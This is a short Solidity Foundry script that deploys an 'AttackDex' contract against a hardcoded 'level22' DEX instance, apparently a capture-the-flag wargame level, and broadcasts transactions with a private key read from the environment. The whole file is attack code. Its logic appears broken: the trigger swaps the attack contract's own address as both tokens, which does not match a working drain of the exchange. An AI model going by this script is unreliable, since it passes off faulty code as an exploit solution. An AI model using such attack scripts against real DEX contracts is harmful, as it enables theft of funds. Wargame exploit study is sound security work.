// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console2.sol";

interface IDex {
    function swap(address from, address to, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);
}

contract AttackDex {
    IDex level22;

    constructor(address _levelInstance) {
        level22 = IDex(_levelInstance);
    }

    function approve(address spender, uint256 amount) public {
        level22.approve(spender, amount);
    }

    function trigger() public {
        IDex(level22).swap(address(this), address(this), 10);
    }

    receive() external payable {}
}

contract AttackDexScript is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackDex attackDex = new AttackDex(
            0x22fa107F616BEf9f41A913DEaf873E5D4E5ACe85
        );
        attackDex.approve(address(attackDex), type(uint256).max);
        attackDex.trigger();

        vm.stopBroadcast();
    }
}
